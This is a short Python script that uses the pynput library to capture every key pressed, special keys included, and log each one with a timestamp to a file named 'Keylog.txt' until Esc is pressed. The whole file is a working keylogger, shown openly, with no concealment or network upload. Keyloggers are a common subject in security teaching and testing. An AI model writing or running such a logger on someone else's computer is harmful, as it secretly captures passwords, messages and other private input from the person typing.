from pynput import keyboard
import logging

# Setting up the logging module to write debugging information and the format (timestamp: message) to a file called "Keylog.txt".
logging.basicConfig(filename="Keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as lisnter:
    lisnter.join()